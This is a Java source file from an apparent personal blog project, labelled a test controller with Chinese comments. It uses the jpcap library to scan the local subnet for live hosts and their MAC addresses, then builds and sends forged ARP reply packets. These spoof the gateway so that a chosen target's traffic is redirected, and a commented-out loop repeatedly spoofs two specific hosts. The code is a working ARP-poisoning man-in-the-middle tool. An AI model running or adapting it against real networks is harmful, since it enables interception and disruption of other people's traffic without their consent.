package top.lemonz.blog.controller;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import top.lemonz.blog.jpcap.NetUtil;

import java.io.IOException;
import java.net.InetAddress;
import java.util.*;

/**
 * Created by IntelliJ IDEA.
 *
 * @author NingZe
 * description: 测试
 * path: LEMONBLOG-top.lemonz.blog.controller-TestController
 * date: 2019/9/16 0016 17:55
 * version: 02.06
 * To change this template use File | Settings | File Templates.
 */
public class TestController {

    /**
     * 日志
     */
    private final static Logger log = LoggerFactory.getLogger(TestController.class);

    /**
     * 重发间隔时间
     */
    public static Integer TIME = 1;

    /**
     * 输入
     */
    public static Scanner SCANNER = new Scanner(System.in);

    /**
     * 本机IP
     */
    public static String MYIP;

    /**
     * 本机MAC
     */
    public static String MYMAC;

    /**
     * 本机IP对象
     */
    public static InetAddress MYIPOBJ;

    /**
     * 本机MAC数组
     */
    public static byte[] MYMACARR;

    /**
     * 网络段
     */
    public static String NETSEGMENT;

    /**
     * 网关IP
     */
    public static String GATEWAYIP;

    /**
     * 网关MAC
     */
    public static String GATEWAYMAC;

    /**
     * 网关IP对象
     */
    public static InetAddress GATEWAYIPOBJ;

    /**
     * 网关MAC数组
     */
    public static byte[] GATEWAYMACARR;

    /**
     * 存储IP-Mac键值对
     */
    public static Map<String, String> IPANDMACS = new HashMap<>();

    /**
     * 网卡对象
     */
    public static NetworkInterface DEVICE;

    /**
     * 设备发送对象
     */
    public static JpcapSender SENDER;

    /**
     * 是否初始化
     */
    public static Boolean BL = true;

    /**
     * 初始化静态代码块
     */
    static {
        try {
            if (BL) {
                // 扫描本机IP与MAC
                Map<String, String> locaIpAndMac = NetUtil.findLocaIpAndMac();
                // 本机IP
                MYIP = locaIpAndMac.get("ip");
                // 本机IP对象
                MYIPOBJ = InetAddress.getByName(MYIP);
                // 本机MAC
                MYMAC = locaIpAndMac.get("mac");
                // 本机MAC数组
                MYMACARR = NetUtil.stomac(MYMAC);
                // 网络段
                NETSEGMENT = MYIP.substring(0, MYIP.lastIndexOf("."));
                // 网关IP
                GATEWAYIP = NETSEGMENT + ".1";
                // 网关IP对象
                GATEWAYIPOBJ = InetAddress.getByName(GATEWAYIP);
                // 网关MAC
                GATEWAYMAC = NetUtil.getMacAddress(GATEWAYIPOBJ.getHostName());
                // 网关MAC数组
                GATEWAYMACARR = NetUtil.stomac(GATEWAYMAC);
                // 自动打开默认网卡（失败将自动切换为手动打开）
                SENDER = selfOpenDevice();
                // 扫描并存储网段下所有存活主机的IP与MAC
                IPANDMACS = findAllMacAddress(NETSEGMENT);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception {

//        // 发送ARP应答包
//        for (int i = 1; true; i++) {
//            convertIpAndMac("192.168.9.121", "D4-BB-C8-87-17-E7");
//            convertIpAndMac("192.168.9.113", "00-0C-29-85-17-1E");
//            log.info("欺骗： " + i + " -> 192.168.9.113 AND 192.168.9.121");
//            Thread.sleep(TIME * 1000);
//        }

    }

    /**
     * 扫描并存储网段下所有存活主机的IP与MAC
     *
     * @throws Exception
     */
    private static Map<String, String> findAllMacAddress(String netsegment) throws Exception {
        // 存储 IP-MAC 键值对
        Map<String, String> maps = new HashMap(26);
        // start time
        Long l1 = System.currentTimeMillis();
        //// 方式一 + 方式二 即可缩小范围以及更精准的获取有效数据信息
        //// 方式一：arp -a ip 扫描存活主机
        // 1. 初始化 1-255 个网络地址，当然也可以自己指定范围（默认情况网关后缀为1，所以从2开始）
        ArrayList<String> list = new ArrayList<>();
        for (int i = 1; i <= 255; i++) {
            list.add(netsegment + "." + i);
        }
        // 2. 扫描当前局域网中所有存活的主机
        log.info("开始扫描当前局域网所有存活主机, 预计耗时: 30 秒.");
        for (int i = 0; i < list.size(); i++) {
            // ip（当前ip地址）
            String tarip = list.get(i);
            // mac（执行cmd命令获得MAC地址）
            String tarmac = NetUtil.getMacAddress(tarip).toUpperCase();
            // 目标主机的MAC不存在，继续下一轮
            if (tarmac == null || tarmac.equals("")) {
                continue;
            }
            log.info("IP-> " + tarip + "   ,   " + "MAC-> " + tarmac);
            // 存储 ip-mac
            maps.put(tarip, tarmac);
        }
        //// 方式二：arp 发送请求，以响应结果判断存活主机
        JpcapCaptor captor = JpcapCaptor.openDevice(DEVICE, 2000, false, 3000);
        captor.setFilter("arp", true);
        JpcapSender sender = captor.getJpcapSenderInstance();
        for (int i = 0; i < list.size(); i++) {
            // ip（当前ip地址）
            String tarip = list.get(i);
            // 参数介绍
            // 1.网卡MAC地址 2. 网卡地址对象中第一个地址对象（其实就是本机地址对象）
            // 3. 伪造MAC地址并转换为数组 4. 设置需要向其发送ARP请求的主机IP
            sender.sendPacket(constractReqArps(DEVICE.mac_address, DEVICE.addresses[1].address, NetUtil.stomac("ff-ff-ff-ff-ff-ff"), InetAddress.getByName(tarip)));
            //// 监听所有捕获到的数据包
            ARPPacket p = (ARPPacket) captor.getPacket();
            if (p == null) {
                System.out.println("未获取到返回ARP信息");
            } else {
                /*
                 * 按照ARP协议的定义，请求目标主机的MAC地址，需要向本局域网内的所有主机广播ARP请求
                 * 挡目标主机监听到此请求
                 * 其会向请求发送方定向的回应自己的MAC地址
                 * 所以我只需要获取响应信息
                 */
                if (p.operation != ARPPacket.ARP_REPLY) {
                    continue;
                }

                //// 将byte[]数组解析为标志IP地址
                StringBuilder str = new StringBuilder();
                for (byte part : p.sender_protoaddr) {
                    String hex = (part & 0xff) < 0 ? String.valueOf(part & 0xff + 256) : String.valueOf(part & 0xff);
                    str.append(hex);
                    str.append('.');
                }

                String ip = str.toString().substring(0, str.length() - 1);

                /*
                 * 判断目标主机是否存活
                 * 有两种情况会返回MAC地址为00-00-00-00-00-00
                 * 1.目标IP上不存在存活主机
                 * 2.目标主机已做静态绑定 对于静态绑定的主机是无法向路由器篡改其MAC地址的
                 */
                boolean isAlive = false;
                byte[] deadMac = NetUtil.stomac("00-00-00-00-00-00");
                if (!(p.target_hardaddr[0] == deadMac[0]
                        && p.target_hardaddr[1] == deadMac[1]
                        && p.target_hardaddr[2] == deadMac[2]
                        && p.target_hardaddr[3] == deadMac[3]
                        && p.target_hardaddr[4] == deadMac[4]
                        && p.target_hardaddr[5] == deadMac[5])) {
                    isAlive = true;
                }
                if (!isAlive) {
                    System.out.println("目标主机未存活");
                    continue;
                }

                // 将byte[]数组解析为标志IP地址
                // 保存可用的目标主机IP-MAC对
                if (!maps.containsKey(ip)) {
                    str = new StringBuilder();
                    //// 解析ARP响应方MAC地址
                    for (byte part : p.sender_hardaddr) {
                        String hex = Integer.toHexString(part & 0xff).toUpperCase();
                        str.append(hex.length() == 1 ? "0" + hex : hex);
                        str.append('-');
                    }
                    String tarmac = str.substring(0, str.length() - 1);
                    log.info("IP-> " + ip + "   ,   " + "MAC-> " + tarmac);
                    maps.put(ip, tarmac);
                } else {
                    // System.out.println("当前扫描IP记录已存在，进入下一轮");
                    continue;
                }
            }
        }
        // stop time
        Long l2 = System.currentTimeMillis();
        log.info("扫描完成, 一共 " + maps.size() + " 个主机存活, 实际耗时: " + ((l2 - l1) / 1000) + " 秒.");
        return maps;
    }

    /**
     * 手动-选择并打开网卡
     *
     * @return
     */
    private static JpcapSender manOpenDevice() throws IOException {
        // 枚举网卡
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        for (int i = 0; i < devices.length; i++) {
            log.info(i + "." + devices[i].description);
        }
        // 选择网卡
        log.info("选择一个网卡：");
        // 获得指定下标的网卡
        DEVICE = devices[SCANNER.nextInt()];
        log.info("手动选择的网卡为: " + DEVICE.description + ".");
        // 打开设备并返回
        return JpcapSender.openDevice(DEVICE);
    }

    /**
     * 自动-打开网卡
     *
     * @return
     */
    private static JpcapSender selfOpenDevice() throws IOException {
        // 枚举网卡
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        for (int i = 0; i < devices.length; i++) {
            // Realtek公司PCIe接口千兆以太网系列控制器（大多数都是这个呢）
            if ("Realtek PCIe GBE Family Controller".equals(devices[i].description)) {
                // 保存网卡
                DEVICE = devices[i];
                break;
            }
        }
        // 打开失败（默认指定网卡不存在）
        if (DEVICE == null) {
            log.info("自动打开网卡失败. 正在尝试手动开启, 稍等......");
            // 手动选择并打开设备
            return manOpenDevice();
        }
        log.info("自动选择的网卡为: " + DEVICE.description + ".");
        // 打开设备并返回
        return JpcapSender.openDevice(DEVICE);
    }

    /**
     * 转换Ip-Mac
     */
    private static void convertIpAndMac(String tarip, String tarmac) throws Exception {

        // 目标主机的IP对象与Mac数组
        InetAddress targetIp = InetAddress.getByName(tarip);
        byte[] targetMac = NetUtil.stomac(tarmac);
//        // 告诉目标主机：我是路由器（根据IP来确定身份），实则填写的却是本机的Mac地址
//        ARPPacket arp1 = constractReqArps(MYMACARR, GATEWAYIPOBJ, targetMac, targetIp);
//        // 同样的方式欺骗路由器
//        ARPPacket arp2 = constractReqArps(MYMACARR, targetIp, GATEWAYMACARR, GATEWAYIPOBJ);
//        // 在欺骗目标的同时，自己的主机ARP表也会被破坏，导致访问不到路由器
//        // 所以下面两个包是告诉本机正确的IP地址对应的Mac地址
//        ARPPacket arp3 = constractReqArps(GATEWAYMACARR, GATEWAYIPOBJ, MYMACARR, MYIPOBJ);
//        ARPPacket arp4 = constractReqArps(targetMac, targetIp, MYMACARR, MYIPOBJ);

        // MYMACARR -> 可伪造
        ARPPacket arp = constractReqArps(MYMACARR, targetIp, GATEWAYMACARR, GATEWAYIPOBJ);
        SENDER.sendPacket(arp);

    }

    /**
     * 构造ARP包请求
     */
    private static ARPPacket constractReqArps(byte[] sender_hardaddr, InetAddress sender_protoaddr, byte[] target_hardaddr, InetAddress target_protoaddr) {
        // 设置ARP包
        ARPPacket arp = new ARPPacket();
        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
        arp.prototype = ARPPacket.PROTOTYPE_IP;
        // ARPPacket.ARP_REPLY用于接受MAC地址
        arp.operation = ARPPacket.ARP_REPLY;
        arp.hlen = 6;
        arp.plen = 4;
        arp.sender_hardaddr = sender_hardaddr;
        arp.sender_protoaddr = sender_protoaddr.getAddress();
        arp.target_hardaddr = target_hardaddr;
        arp.target_protoaddr = target_protoaddr.getAddress();
        // 设置DLC帧
        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac = sender_hardaddr;
        ether.dst_mac = target_hardaddr;
        arp.datalink = ether;
        return arp;
    }


}